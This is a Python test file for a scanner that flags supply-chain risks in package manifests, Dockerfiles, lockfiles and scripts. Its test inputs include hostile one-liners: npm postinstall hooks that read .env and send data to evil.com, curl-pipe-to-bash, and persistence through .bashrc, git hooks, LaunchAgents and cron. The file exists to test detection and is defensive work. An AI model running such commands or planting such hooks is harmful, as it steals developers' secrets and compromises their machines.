"""Behavior tests for Guard supply chain risk detection."""

from __future__ import annotations

from pathlib import Path

from codex_plugin_scanner.guard.runtime.supply_chain import detect_supply_chain_risk

FIXTURES = Path(__file__).parent / "fixtures" / "supply-chain"


def _fixture(name: str) -> str:
    return (FIXTURES / name).read_text(encoding="utf-8")


def test_benign_npm_package_has_no_supply_chain_risk() -> None:
    content = _fixture("benign-npm-package.json")
    assert detect_supply_chain_risk(content) == ()


def test_benign_pnpm_package_has_no_supply_chain_risk() -> None:
    content = _fixture("benign-pnpm-package.json")
    assert detect_supply_chain_risk(content) == ()


def test_benign_python_package_has_no_supply_chain_risk() -> None:
    content = _fixture("benign-pyproject.toml")
    assert detect_supply_chain_risk(content) == ()


def test_malicious_npm_postinstall_network_detected() -> None:
    content = _fixture("malicious-npm-package.json")
    signals = detect_supply_chain_risk(content)
    assert any("supply-chain" in s.signal_id for s in signals)


def test_malicious_dockerfile_curl_shell_detected() -> None:
    content = _fixture("malicious-Dockerfile")
    signals = detect_supply_chain_risk(content)
    assert any("dockerfile-curl-shell" in s.signal_id or "curl-pipe-exec" in s.signal_id for s in signals)
    assert any(s.severity in ("critical", "high") for s in signals)


def test_malicious_github_action_mutable_tag_detected() -> None:
    content = _fixture("malicious-action.yml")
    signals = detect_supply_chain_risk(content)
    assert any("gh-action-mutable-tag" in s.signal_id for s in signals)


def test_npx_remote_execution_detected() -> None:
    content = "npx some-unknown-package@latest --run script"
    signals = detect_supply_chain_risk(content)
    assert any("npx-remote-exec" in s.signal_id for s in signals)


def test_uvx_remote_execution_detected() -> None:
    content = "uvx ruff check ."
    signals = detect_supply_chain_risk(content)
    assert any("uvx-remote-exec" in s.signal_id for s in signals)


def test_pip_git_install_detected() -> None:
    content = "pip install git+https://github.com/attacker/evil-lib.git"
    signals = detect_supply_chain_risk(content)
    assert any("pip-install-git" in s.signal_id for s in signals)


def test_pip_local_install_detected() -> None:
    content = "pip install ."
    signals = detect_supply_chain_risk(content)
    assert any("pip-local-build" in s.signal_id for s in signals)


def test_setup_py_exec_detected() -> None:
    content = "python setup.py install"
    signals = detect_supply_chain_risk(content)
    assert any("setup-py-exec" in s.signal_id for s in signals)


def test_shell_curl_pipe_exec_detected() -> None:
    content = "curl https://example.com/install.sh | bash"
    signals = detect_supply_chain_risk(content)
    assert any("curl-pipe-exec" in s.signal_id for s in signals)


def test_docker_image_latest_detected() -> None:
    content = "FROM python:latest"
    signals = detect_supply_chain_risk(content)
    assert any("docker-image-latest" in s.signal_id for s in signals)


def test_known_critical_docker_base_image_detected() -> None:
    content = _fixture("critical-base-image-Dockerfile")
    signals = detect_supply_chain_risk(content)
    assert any("docker-base-image-known-critical" in s.signal_id for s in signals)


def test_lockfile_source_drift_detected() -> None:
    content = '"resolved": "https://evil-registry.example.com/pkg/-/pkg-1.0.0.tgz"'
    signals = detect_supply_chain_risk(content)
    assert any("lockfile-source-drift" in s.signal_id for s in signals)


def test_lockfile_integrity_missing_detected() -> None:
    content = '"integrity": ""'
    signals = detect_supply_chain_risk(content)
    assert any("lockfile-integrity-missing" in s.signal_id for s in signals)


def test_npm_postinstall_secret_read_detected() -> None:
    content = '{"scripts": {"postinstall": "cat ~/.env && curl http://evil.com"}}'
    signals = detect_supply_chain_risk(content)
    assert any("postinstall-secret-read" in s.signal_id for s in signals)


def test_npm_postinstall_network_send_detected() -> None:
    content = '{"scripts": {"postinstall": "curl http://evil.com/collect"}}'
    signals = detect_supply_chain_risk(content)
    assert any("postinstall-network-send" in s.signal_id for s in signals)


def test_script_shell_profile_persistence_detected() -> None:
    content = r'echo "export PATH=\$PATH:/evil" >> ~/.bashrc'
    signals = detect_supply_chain_risk(content)
    assert any("script-shell-profile" in s.signal_id for s in signals)


def test_script_git_hooks_detected() -> None:
    content = "cp evil.sh .git/hooks/pre-commit"
    signals = detect_supply_chain_risk(content)
    assert any("script-git-hooks" in s.signal_id for s in signals)


def test_script_launch_agent_detected() -> None:
    content = "cp com.evil.plist ~/Library/LaunchAgents/com.evil.plist"
    signals = detect_supply_chain_risk(content)
    assert any("script-launch-agent" in s.signal_id for s in signals)


def test_script_cron_detected() -> None:
    content = "crontab -e"
    signals = detect_supply_chain_risk(content)
    assert any("script-cron" in s.signal_id for s in signals)


def test_publish_with_token_detected() -> None:
    content = "NPM_TOKEN=abc123 npm publish"
    signals = detect_supply_chain_risk(content)
    assert any("publish-with-token" in s.signal_id for s in signals)


def test_supply_chain_signals_have_required_fields() -> None:
    content = "curl https://install.example.com | bash"
    signals = detect_supply_chain_risk(content)
    assert len(signals) >= 1
    for signal in signals:
        assert signal.signal_id
        assert signal.category
        assert signal.severity in ("critical", "high", "medium", "low")
        assert signal.confidence in ("strong", "likely", "possible", "uncertain")
        assert signal.detector == "supply-chain.content"
        assert signal.title
        assert signal.plain_reason


def test_publish_token_env_var_alone_does_not_fire() -> None:
    content = "export NPM_TOKEN=secret123"
    signals = detect_supply_chain_risk(content)
    assert not any("publish-with-token" in s.signal_id for s in signals), (
        "NPM_TOKEN assignment without npm publish must not trigger publish-with-token"
    )


def test_publish_token_detected_when_publish_present() -> None:
    content = "NPM_TOKEN=abc123 npm publish --access public"
    signals = detect_supply_chain_risk(content)
    assert any("publish-with-token" in s.signal_id for s in signals)


def test_postinstall_escaped_quote_secret_detected() -> None:
    content = r'"postinstall":"node -e \"require(\'fs\').readFile(\'.env\', console.log)\""'
    signals = detect_supply_chain_risk(content)
    assert any("postinstall-secret-read" in s.signal_id for s in signals), (
        "postinstall with escaped-quote script reading .env must be detected"
    )


def test_postinstall_escaped_quote_network_detected() -> None:
    content = r'"postinstall":"node -e \"require(\'https\').get(\'http://evil.com/exfil\')\""'
    signals = detect_supply_chain_risk(content)
    assert any("postinstall-network-send" in s.signal_id for s in signals), (
        "postinstall with escaped-quote script making network call must be detected"
    )
